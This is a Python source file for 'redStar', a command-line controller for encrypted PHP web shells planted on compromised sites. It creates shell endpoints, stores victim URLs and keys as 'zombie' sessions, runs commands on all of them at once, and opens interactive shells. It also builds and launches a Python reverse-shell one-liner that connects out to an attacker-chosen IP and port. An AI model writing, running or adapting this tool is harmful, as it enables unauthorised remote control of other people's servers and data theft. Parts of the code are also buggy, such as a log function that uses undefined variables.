# -*- coding: utf-8 -*-
import argparse
import sys
import cmd
import os
import requests
from colorama import Fore, Style
import uuid
import sqlite3
from prettytable import PrettyTable

#IMPORT REDSTAR
from redStar.shellCreator 		import *		#Encryption Decryption 
from redStar.shellManagement 	import *		#add,delete, execute command zombie
from redStar.util 				import *		#


session = ""
class interactiveMenu(cmd.Cmd):
 
		

	intro = f'''{Fore.RED}		.
    ~           ,O,
     ´         ,OOO,			,
      .  'oooooOOOOOooooo'
       .   `OOOOOOOOOOO`
        '    `OOOOOOO`	`	-
 `           OOOO'OOOO
  .         OOO'   'OOO 	.	,
    `      O'         'O{Style.RESET_ALL}'''+"\n"+f'{Fore.BLUE}Welcome to the redStar.   Type help or ? to list commands.{Style.RESET_ALL}\n'
	prompt = 'redStar> '
	doc_header = 'Avaible Commands (type help <topic>):'
	undoc_header = '' # no way

	def do_exit(self, inp):
		'''Exit the redStar :('''	
		bye()
		return True

	def do_clearDB(self, inp):
		'''Hide in bush'''
		sql = '''SELECT * FROM sessions WHERE url = ?'''
		conn = sqlite3.connect('sessions/redStar.db')
		cur = conn.cursor() 
		sql = 'DELETE FROM sessions'
		cur.execute(sql)
		conn.commit()
		cur.close() 
		print(f"{Fore.BLUE}[*] Database Cleared{Style.RESET_ALL}")
		return False

	def do_multiTask(self, inp): # this must be Multithreaded
		'''Hack'em ALL'''	
		if(inp==""):
			print(f"{Fore.RED}[-] Missing Arg{Style.RESET_ALL}")
			return False	
		conn = sqlite3.connect('sessions/redStar.db')
		cur = conn.cursor()
		sql = 'SELECT session_id,url,key FROM sessions'
		allSess = cur.execute(sql).fetchall()
		cur.close()
		if(len(allSess)==0):
			print(f"{Fore.RED}[-] There is no session database{Style.RESET_ALL}")
			return False
		t = PrettyTable(['URL', 'STATUS'])
		t.align = "l"
		for x in allSess:
			s = shellManagement.executeCommand(x[1],x[2],inp)
			if(s==-12):
				t.add_row([str(x[1]),f"{Fore.RED}Decryption Error{Style.RESET_ALL}"]) 
				continue
			elif(s==-11):
				t.add_row([str(x[1]),f"{Fore.RED}Host Not Reachable{Style.RESET_ALL}"])
				continue 
			elif(s==-10):
				t.add_row([str(x[1]),f"{Fore.RED}Endpoint Not Reachable{Style.RESET_ALL}"])
				continue 
			elif(s<0):
				t.add_row([str(x[1]),f"{Fore.RED}Unknown Error{Style.RESET_ALL}"])
				continue 
			t.add_row([str(x[1]),f"{Fore.GREEN}Executed{Style.RESET_ALL}"]) 
		print(t)
		return False

	def do_checkOnlineSessions(self, inp): # must be Multithreaded 
		'''cheks for online status'''

		conn = sqlite3.connect('sessions/redStar.db')
		cur = conn.cursor()
		sql = 'SELECT session_id,url,key FROM sessions'
		allSess = cur.execute(sql).fetchall()
		if(len(allSess)==0):
			print(f"{Fore.RED}[-] Session not found{Style.RESET_ALL}")
			return False

		cur.close()
 
		t = PrettyTable(['URL', 'STATUS'])
		t.align = "l"
		for x in allSess:
			resp = shellManagement.executeCommand(x[1],x[2],"echo 'ok'")
			if(isinstance(resp,str)):
				resp = resp.replace("\n","")
			if(resp=="ok"):
				t.add_row([str(x[1]),f"{Fore.GREEN}Online{Style.RESET_ALL}"]) 
			else:
				t.add_row([str(x[1]),f"{Fore.RED}Offline{Style.RESET_ALL}"])
		print(t)
		return False


	def do_createEndpoint(self,inp):
		'''
		Creates endpoint for redStar 
		'''
		thisPath = os.getcwd()+"/endPoints/"+uuid.uuid4().hex.upper()[0:6]+".php"
		if(inp==""):
			key = input("AES Key: ")
			print("\nSave endpoint to (Enter==1);\n1."+thisPath+"\n2.Custom\n")
			c = input("Choice: ")
			
		else:
			inp = parse(inp)
			if(len(inp)==2):

				key = str(inp[0])
				c = str(inp[1])
 
			else:
				print(f"{Fore.RED}[-] Missing arg [usage; createEndpoint [key] [Choice] ]{Style.RESET_ALL}")
				return False

		if(c=="" or c=="1"):
			path = thisPath
		elif(c=="2"):
			path = input("Custom Path (Eg. /tmp/test.php): ")

		cShellEncryptedAndB64Encoded = shellCreator.customShell(key)
		f = open(path,"w")
		f.write(cShellEncryptedAndB64Encoded)
		print(f"{Fore.GREEN}[+] Shell Created at " + path+f"{Style.RESET_ALL}")
		 
		 

	def do_addEndpoint(self, inp):
		'''Add new zombiee'''	
		if(inp==""):
			print(f"{Fore.RED}[-] Missing arg [Usage; addEndpoint [url] [key]\nEx. addEndpoint http://localhost/end.php 123456{Style.RESET_ALL}")
			return False

		inp = parse(inp)


		if(len(inp)!=2):
			print(f"{Fore.RED}[-] Wrong usage [link must start with \"http\" or \"https\"]{Style.RESET_ALL}")
			return False
		
		url = str(inp[0])
		key = str(inp[1])
		
		if(not (url.startswith("http") or url.startswith("https")) ):
			print(f"{Fore.RED}[-] Wrong usage [link must start with \"http\" or \"https\"]{Style.RESET_ALL}")
			return False
			
		if(shellManagement.checkLocal(url,key)):
			shellManagement.addNewEndPoint(url,key)
	def emptyline(self):
		return False
 

	def do_banner(self, inp):
		'''Be redStar '''	
		print(f'''{Fore.RED}		.
    ~           ,O,
     ´         ,OOO,			,
      .  'oooooOOOOOooooo'
       .   `OOOOOOOOOOO`
        '    `OOOOOOO`	`	-
 `           OOOO'OOOO
  .         OOO'   'OOO 	.	,
    `      O'         'O{Style.RESET_ALL}''')
 

	def do_sessions(self,inp):
		'''
		Interact with ur sessions
		'''
		global session
		inp = parse(inp)
		if(len(inp)>=3):
			print(f"{Fore.RED}[-] Session not found{Style.RESET_ALL}")
			return False	
		if len(inp)==2:
			session = inp[0].replace("\n","")
			conn = sqlite3.connect('sessions/redStar.db')
			cur = conn.cursor()
			sql = 'SELECT session_id FROM sessions WHERE session_id=?'
			data = (session,)
			t1 = cur.execute(sql,data).fetchall()
			if(len(t1)==0):
				print(f"{Fore.RED}[-] Session not found{Style.RESET_ALL}")
				return False	
			print
			checkSess = len(cur.execute(sql,data).fetchall()[0])
			cur.close()

			if(checkSess==1 and inp[1]=="shell"):
				conn = sqlite3.connect('sessions/redStar.db')
				cur = conn.cursor()
				sql = ' SELECT * FROM sessions WHERE session_id=?'
				data = (session,)
				sessionData = cur.execute(sql,data).fetchall()
				cur.close() 
				
				if(not shellManagement.check(sessionData[0][2],sessionData[0][3])):
					return False
				user = shellManagement.executeCommand(sessionData[0][2],sessionData[0][3],"whoami").replace("\n","")
				host = shellManagement.executeCommand(sessionData[0][2],sessionData[0][3],"hostname").replace("\n","")

				while True:
					try:

						shell = input(f"[{Fore.RED}redStar{Style.RESET_ALL}] {Fore.GREEN}"+user+f"{Style.RESET_ALL}{Fore.BLUE}@{Style.RESET_ALL}{Fore.GREEN}"+host+f"{Style.RESET_ALL}:~$ ")
						if("exit"==shell):
							return False
						if("" == shell):
							continue
						if("upload"==shell):
							a=1
						print(shellManagement.executeCommand(sessionData[0][2],sessionData[0][3],shell))
					except KeyboardInterrupt:
						print("\n")
						return False
			elif(checkSess==1 and inp[1]=="reverseShell"):
				conn = sqlite3.connect('sessions/redStar.db')
				cur = conn.cursor()
				sql = ' SELECT * FROM sessions WHERE session_id=?'
				data = (session,)
				sessionData = cur.execute(sql,data).fetchall()
				cur.close() 

				ip = input("Ip Addr: ")
				port = input("Port: ")

				# ADD more choice
				pythonRev = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+str(ip)+"\","+str(port)+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]) ;' &"

				shellManagement.executeCommand(sessionData[0][2],sessionData[0][3],pythonRev).replace("\n","")
				return False

			elif(checkSess==1 and inp[1]=="delete"):
				conn = sqlite3.connect('sessions/redStar.db')
				cur = conn.cursor()
				delSql = 'DELETE FROM sessions WHERE session_id=?'
				data = (session,)
				cur.execute(delSql,data)
				print("[+] "+str(session)+" Session Deleted ")
				conn.commit()
				cur.close() 
				return False


			else:
				print(f"{Fore.RED}[-] Session not found{Style.RESET_ALL}")
				session=""
		if(len(inp)==1):
			conn = sqlite3.connect('sessions/redStar.db')
			cur = conn.cursor()
			sql = 'SELECT * FROM sessions WHERE session_id=?'
			sess = cur.execute(sql,(inp[0],)).fetchall()
			cur.close()
			if(len(sess)==0):
				print(f"{Fore.RED}[-] Session not found{Style.RESET_ALL}")
				return False	
			t = PrettyTable(['SESSION_ID', 'URL','KEY','CREATED_TIME'])
			t.align="l"

			for x in sess:
				t.add_row([x[1],x[2],x[3],x[4]])
			print(t)
			return False

		if(len(inp)==0):
			conn = sqlite3.connect('sessions/redStar.db')
			cur = conn.cursor()
			sql = '''SELECT * FROM sessions'''
			sess = cur.execute(sql).fetchall() 
			cur.close()
			if(len(sess)==0):
				print(f"{Fore.RED}[-] There is no session database{Style.RESET_ALL}")
				return False
			shellManagement.getSessions()
	 

	def complete_sessions(self, text, line, begidx, endidx):

		arg = line.replace("sessions","")
		arg = arg.lstrip()
		#print(arg)

		conn = sqlite3.connect('sessions/redStar.db')
		cur = conn.cursor()
	


		if(len(arg)>=12):

			sql = '''
			SELECT session_id FROM sessions WHERE session_id=?;
			'''
			session_id = str(arg)[:12]
			sess = cur.execute(sql,(session_id,)).fetchall()
			cur.close()
			listt=["shell","db","reverseShell","delete"]
			if(len(sess)==1):
	 
				text = text.lstrip()
				if(text=="" ):
					return listt
				
				ret = []

				for x in listt:
					if(x.startswith(text)):
						ret.append(x)
						return ret
			
		else:


			sql = '''
			SELECT session_id FROM sessions;
			'''
			sess = cur.execute(sql).fetchall()
			cur.close()




			#print(list(sess[0]))
			listt=[]
			for i in sess:

				if(str(i[0]).startswith(text)):

					listt.append(str(i[0]))
			return listt


	def ado_showLogs(self,inp):
		conn = sqlite3.connect('sessions/redStar.db')
		cur = conn.cursor()
		sql = '''
		SELECT * FROM logs;
		'''
		sessionData = cur.execute(sql).fetchall()
		cur.close()
		for i in sessionData:
			user = shellManagement.executeCommand(sessionData[i][2],sessionData[i][3],"whoami").replace("\n","")
			host = shellManagement.executeCommand(sessionData[i][2],sessionData[i][3],"hostname").replace("\n","")

			t = PrettyTable(['SESSION_ID', 'URL','LAST SEEN'])

			for x in range(0,len(sess)):
				t.add_row([sess[x][1], sess[x][2],sess[x][4]]) 
			print(t)